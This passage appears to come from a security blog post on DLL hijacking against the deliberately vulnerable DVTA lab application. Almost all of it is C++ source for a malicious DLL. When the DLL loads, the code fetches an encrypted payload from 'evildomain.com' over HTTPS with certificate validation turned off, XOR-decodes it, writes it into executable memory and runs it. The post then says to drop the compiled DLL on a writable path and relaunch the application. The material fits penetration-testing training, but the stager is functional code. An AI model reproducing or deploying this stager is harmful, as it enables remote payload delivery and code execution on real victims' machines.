#b4b4b4;">;</span><br><br><span style="color: #dadada;"> HINTERNET hSession </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">NULL</span><span style="color: #b4b4b4;">,</span><br><br><span style="color: #dadada;"> hConnect </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">NULL</span><span style="color: #b4b4b4;">,</span><br><br><span style="color: #dadada;"> hRequest </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">NULL</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #57a64a;"> // Use WinHttpOpen to obtain a session handle.</span><br><br><span style="color: #dadada;"> hSession </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">WinHttpOpen</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">L </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">WinHTTP Example/1.0</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">,</span><br><br><span style="color: #dadada;"> WINHTTP_ACCESS_TYPE_DEFAULT_PROXY</span><span style="color: #b4b4b4;">,</span><br><br><span style="color: #dadada;"> WINHTTP_NO_PROXY_NAME</span><span style="color: #b4b4b4;">,</span><br><br><span style="color: #dadada;"> WINHTTP_NO_PROXY_BYPASS</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">0</span><span style="color: #b4b4b4;">);</span><br><br><span style="color: #57a64a;"> // Specify an HTTP server.</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">if</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">hSession</span><span style="color: #b4b4b4;">)</span><br><br><span style="color: #dadada;"> hConnect </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">WinHttpConnect</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">hSession</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">LPCWSTR</span><span style="color: #b4b4b4;">)</span><span style="color: #dadada;"> host</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> port</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">0</span><span style="color: #b4b4b4;">);</span><br><br><span style="color: #dadada;"> DWORD dwFlags </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> SECURITY_FLAG_IGNORE_UNKNOWN_CA </span><span style="color: #b4b4b4;">|</span><span style="color: #dadada;"> SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE </span><span style="color: #b4b4b4;">|</span><span style="color: #dadada;"> SECURITY_FLAG_IGNORE_CERT_CN_INVALID </span><span style="color: #b4b4b4;">|</span><span style="color: #dadada;"> SECURITY_FLAG_IGNORE_CERT_DATE_INVALID</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #57a64a;"> // Create an HTTP request handle.</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">if</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">hConnect</span><span style="color: #b4b4b4;">)</span><br><br><span style="color: #dadada;"> hRequest </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">WinHttpOpenRequest</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">hConnect</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> L </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">GET</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> L </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/enc.bin</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> L </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">HTTP/1.1</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> WINHTTP_NO_REFERER</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> WINHTTP_DEFAULT_ACCEPT_TYPES</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> WINHTTP_FLAG_SECURE</span><span style="color: #b4b4b4;">);</span><br><br><span style="color: #57a64a;"> // This is for accepting self signed Cert</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">if</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(!</span><span style="color: #dcdcaa;">WinHttpSetOption</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">hRequest</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> WINHTTP_OPTION_SECURITY_FLAGS</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">&amp;</span><span style="color: #dadada;"> dwFlags</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">sizeof</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">dwFlags</span><span style="color: #b4b4b4;">)))</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><br><br><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">exit</span><span style="color: #b4b4b4;">(</span><span style="color: #b5cea8;">443</span><span style="color: #b4b4b4;">);</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">}</span><br><br><span style="color: #57a64a;"> // Send a request.</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">if</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">hRequest</span><span style="color: #b4b4b4;">)</span><br><br><span style="color: #dadada;"> bResults </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">WinHttpSendRequest</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">hRequest</span><span style="color: #b4b4b4;">,</span><br><br><span style="color: #dadada;"> WINHTTP_NO_ADDITIONAL_HEADERS</span><span style="color: #b4b4b4;">,</span><br><br><span style="color: #dadada;"> </span><span style="color: #b5cea8;">0</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> WINHTTP_NO_REQUEST_DATA</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">0</span><span style="color: #b4b4b4;">,</span><br><br><span style="color: #dadada;"> </span><span style="color: #b5cea8;">0</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">0</span><span style="color: #b4b4b4;">);</span><br><br><span style="color: #57a64a;"> // End the request.</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">if</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">bResults</span><span style="color: #b4b4b4;">)</span><br><br><span style="color: #dadada;"> bResults </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">WinHttpReceiveResponse</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">hRequest</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">NULL</span><span style="color: #b4b4b4;">);</span><br><br><span style="color: #57a64a;"> // Keep checking for data until there is nothing left.</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">if</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">bResults</span><span style="color: #b4b4b4;">)</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">do</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><br><br><span style="color: #57a64a;"> // Check for available data.</span><br><br><span style="color: #dadada;"> dwSize </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">0</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">if</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(!</span><span style="color: #dcdcaa;">WinHttpQueryDataAvailable</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">hRequest</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">&amp;</span><span style="color: #dadada;"> dwSize</span><span style="color: #b4b4b4;">))</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><br><br><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">printf</span><span style="color: #b4b4b4;">(</span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">Error </span><span style="color: #9cdcfe;">%u</span><span style="color: #ce9178;"> in WinHttpQueryDataAvailable.</span><span style="color: #ffd68f;">\n</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">,</span><br><br><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">GetLastError</span><span style="color: #b4b4b4;">());</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">break</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">}</span><br><br><span style="color: #57a64a;"> // No more available data.</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">if</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(!</span><span style="color: #dadada;">dwSize</span><span style="color: #b4b4b4;">)</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">break</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #57a64a;"> // Allocate space for the buffer.</span><br><br><span style="color: #dadada;"> pszOutBuffer </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">new</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">char</span><span style="color: #b4b4b4;">[</span><span style="color: #dadada;">dwSize </span><span style="color: #b4b4b4;">+</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">1</span><span style="color: #b4b4b4;">];</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">if</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(!</span><span style="color: #dadada;">pszOutBuffer</span><span style="color: #b4b4b4;">)</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><br><br><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">printf</span><span style="color: #b4b4b4;">(</span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">Out of memory</span><span style="color: #ffd68f;">\n</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">);</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">break</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">}</span><br><br><span style="color: #57a64a;"> // Read the Data.</span><br><br><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">ZeroMemory</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">pszOutBuffer</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> dwSize </span><span style="color: #b4b4b4;">+</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">1</span><span style="color: #b4b4b4;">);</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">if</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(!</span><span style="color: #dcdcaa;">WinHttpReadData</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">hRequest</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">LPVOID</span><span style="color: #b4b4b4;">)</span><span style="color: #dadada;"> pszOutBuffer</span><span style="color: #b4b4b4;">,</span><br><br><span style="color: #dadada;"> dwSize</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">&amp;</span><span style="color: #dadada;"> dwDownloaded</span><span style="color: #b4b4b4;">))</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><br><br><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">printf</span><span style="color: #b4b4b4;">(</span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">Error </span><span style="color: #9cdcfe;">%u</span><span style="color: #ce9178;"> in WinHttpReadData.</span><span style="color: #ffd68f;">\n</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">GetLastError</span><span style="color: #b4b4b4;">());</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">}</span><span style="color: #dadada;"> </span><span style="color: #d8a0df;">else</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><br><br><span style="color: #dadada;"> </span><span style="color: #569cd6;">int</span><span style="color: #dadada;"> i </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">0</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">while</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">i </span><span style="color: #b4b4b4;">&lt;</span><span style="color: #dadada;"> dwSize</span><span style="color: #b4b4b4;">)</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><br><br><span style="color: #57a64a;"> // Since the cunks are transferred in 8192 bytes, this check is required for larger buffers</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">if</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">counter </span><span style="color: #b4b4b4;">&gt;=</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">sizeof</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">buf</span><span style="color: #b4b4b4;">))</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">break</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">}</span><br><br><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">memcpy</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">&amp;</span><span style="color: #dadada;"> </span><span style="color: #9cdcfe;">buf</span><span style="color: #b4b4b4;">[</span><span style="color: #dadada;">counter</span><span style="color: #b4b4b4;">],</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">&amp;</span><span style="color: #dadada;"> </span><span style="color: #9cdcfe;">pszOutBuffer</span><span style="color: #b4b4b4;">[</span><span style="color: #dadada;">i</span><span style="color: #b4b4b4;">],</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">sizeof</span><span style="color: #b4b4b4;">(</span><span style="color: #569cd6;">char</span><span style="color: #b4b4b4;">));</span><br><br><span style="color: #dadada;"> counter</span><span style="color: #b4b4b4;">++;</span><br><br><span style="color: #dadada;"> i</span><span style="color: #b4b4b4;">++;</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">}</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">}</span><br><br><span style="color: #dadada;"> </span><span style="color: #c586c0;">delete[]</span><span style="color: #dadada;"> pszOutBuffer</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">if</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(!</span><span style="color: #dadada;">dwDownloaded</span><span style="color: #b4b4b4;">)</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">break</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">}</span><span style="color: #dadada;"> </span><span style="color: #d8a0df;">while</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">dwSize </span><span style="color: #b4b4b4;">&gt;</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">0</span><span style="color: #b4b4b4;">);</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">}</span><span style="color: #dadada;"> </span><span style="color: #d8a0df;">else</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><br><br><span style="color: #57a64a;"> // Report any errors.</span><br><br><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">printf</span><span style="color: #b4b4b4;">(</span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">Error </span><span style="color: #9cdcfe;">%d</span><span style="color: #ce9178;"> has occurred.</span><span style="color: #ffd68f;">\n</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">GetLastError</span><span style="color: #b4b4b4;">());</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">}</span><br><br><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">printf</span><span style="color: #b4b4b4;">(</span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">[+] </span><span style="color: #9cdcfe;">%d</span><span style="color: #ce9178;"> Bytes successfully written!</span><span style="color: #ffd68f;">\n</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">sizeof</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">buf</span><span style="color: #b4b4b4;">));</span><br><br><span style="color: #57a64a;"> // Close any open handles.</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">if</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">hRequest</span><span style="color: #b4b4b4;">)</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">WinHttpCloseHandle</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">hRequest</span><span style="color: #b4b4b4;">);</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">if</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">hConnect</span><span style="color: #b4b4b4;">)</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">WinHttpCloseHandle</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">hConnect</span><span style="color: #b4b4b4;">);</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">if</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">hSession</span><span style="color: #b4b4b4;">)</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">WinHttpCloseHandle</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">hSession</span><span style="color: #b4b4b4;">);</span><br><br><span style="color: #b4b4b4;">}</span><br><br><span style="color: #569cd6;">void</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">x</span><span style="color: #b4b4b4;">(</span><span style="color: #569cd6;">char</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">*</span><span style="color: #dadada;"> </span><span style="color: #9a9a9a;">payload</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">int</span><span style="color: #dadada;"> </span><span style="color: #9a9a9a;">payload_length</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">char</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">*</span><span style="color: #dadada;"> </span><span style="color: #9a9a9a;">key</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">int</span><span style="color: #dadada;"> </span><span style="color: #9a9a9a;">length</span><span style="color: #b4b4b4;">)</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><br><br><span style="color: #dadada;"> </span><span style="color: #569cd6;">int</span><span style="color: #dadada;"> j </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">0</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">for</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #569cd6;">int</span><span style="color: #dadada;"> i </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">0</span><span style="color: #b4b4b4;">;</span><span style="color: #dadada;"> i </span><span style="color: #b4b4b4;">&lt;</span><span style="color: #dadada;"> payload_length </span><span style="color: #b4b4b4;">-</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">1</span><span style="color: #b4b4b4;">;</span><span style="color: #dadada;"> i</span><span style="color: #b4b4b4;">++)</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">if</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">j </span><span style="color: #b4b4b4;">==</span><span style="color: #dadada;"> length </span><span style="color: #b4b4b4;">-</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">1</span><span style="color: #b4b4b4;">)</span><span style="color: #dadada;"> j </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">0</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #dadada;"> </span><span style="color: #9cdcfe;">payload</span><span style="color: #b4b4b4;">[</span><span style="color: #dadada;">i</span><span style="color: #b4b4b4;">]</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">^=</span><span style="color: #dadada;"> </span><span style="color: #9cdcfe;">key</span><span style="color: #b4b4b4;">[</span><span style="color: #dadada;">j</span><span style="color: #b4b4b4;">];</span><br><br><span style="color: #dadada;"> </span><span style="color: #569cd6;">unsigned</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">char</span><span style="color: #dadada;"> data </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #9cdcfe;">payload</span><span style="color: #b4b4b4;">[</span><span style="color: #dadada;">i</span><span style="color: #b4b4b4;">]</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">^</span><span style="color: #dadada;"> </span><span style="color: #9cdcfe;">key</span><span style="color: #b4b4b4;">[</span><span style="color: #dadada;">j</span><span style="color: #b4b4b4;">];</span><br><br><span style="color: #dadada;"> j</span><span style="color: #b4b4b4;">++;</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">}</span><br><br><span style="color: #b4b4b4;">}</span><br><br><span style="color: #4ec9b0;">VOID</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">run</span><span style="color: #b4b4b4;">()</span><br><br><span style="color: #b4b4b4;">{</span><br><br><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">Sleep</span><span style="color: #b4b4b4;">(</span><span style="color: #b5cea8;">3000</span><span style="color: #b4b4b4;">);</span><br><br><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">dl</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">L </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">evildomain.com</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #569cd6;">short</span><span style="color: #b4b4b4;">)</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">8443</span><span style="color: #b4b4b4;">);</span><br><br><span style="color: #dadada;"> </span><span style="color: #569cd6;">char</span><span style="color: #dadada;"> key[] </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">e001ffbe97fc842aeb4a91161f6291f1</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #dadada;"> LPVOID address </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> ::</span><span style="color: #dcdcaa;">VirtualAlloc</span><span style="color: #b4b4b4;">(</span><span style="color: #569cd6;">NULL</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">sizeof</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">buf</span><span style="color: #b4b4b4;">),</span><span style="color: #dadada;"> MEM_RESERVE </span><span style="color: #b4b4b4;">|</span><span style="color: #dadada;"> MEM_COMMIT</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> PAGE_EXECUTE_READWRITE</span><span style="color: #b4b4b4;">);</span><br><br><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">x</span><span style="color: #b4b4b4;">((</span><span style="color: #569cd6;">char</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">*</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">)</span><span style="color: #dadada;"> buf</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">sizeof</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">buf</span><span style="color: #b4b4b4;">),</span><span style="color: #dadada;"> key</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">sizeof</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">key</span><span style="color: #b4b4b4;">));</span><br><br><span style="color: #dadada;"> </span><span style="color: #c8c8c8;">std</span><span style="color: #b4b4b4;">::</span><span style="color: #dcdcaa;">memcpy</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">address</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> buf</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">sizeof</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">buf</span><span style="color: #b4b4b4;">));</span><br><br><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">Sleep</span><span style="color: #b4b4b4;">(</span><span style="color: #b5cea8;">5000</span><span style="color: #b4b4b4;">);</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">((</span><span style="color: #569cd6;">void</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">*</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">)())</span><span style="color: #dadada;"> address</span><span style="color: #b4b4b4;">)();</span><br><br><span style="color: #b4b4b4;">}</span><br><br><span style="color: #dadada;">BOOL APIENTRY </span><span style="color: #dcdcaa;">DllMain</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">HMODULE hModule</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> DWORD ul_reason_for_call</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> LPVOID lpReserved</span><span style="color: #b4b4b4;">)</span><br><br><span style="color: #b4b4b4;">{</span><br><br><span style="color: #dadada;"> HANDLE hThread </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">NULL</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">switch</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">ul_reason_for_call</span><span style="color: #b4b4b4;">)</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">case</span><span style="color: #dadada;"> DLL_PROCESS_ATTACH</span><span style="color: #b4b4b4;">:</span><br><br><span style="color: #dadada;"> hThread </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">CreateThread</span><span style="color: #b4b4b4;">(</span><span style="color: #569cd6;">NULL</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">0</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">LPTHREAD_START_ROUTINE</span><span style="color: #b4b4b4;">)</span><span style="color: #dadada;"> run</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">NULL</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">0</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">NULL</span><span style="color: #b4b4b4;">);</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">break</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">case</span><span style="color: #dadada;"> DLL_THREAD_ATTACH</span><span style="color: #b4b4b4;">:</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">break</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">case</span><span style="color: #dadada;"> DLL_THREAD_DETACH</span><span style="color: #b4b4b4;">:</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">break</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">case</span><span style="color: #dadada;"> DLL_PROCESS_DETACH</span><span style="color: #b4b4b4;">:</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">break</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">break</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">}</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">return</span><span style="color: #dadada;"> TRUE</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #b4b4b4;">}</span></div>
</div>
<p>After the DLL file is compiled and placed on the writable path, we can now execute the DVTA application once again.</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-20390">
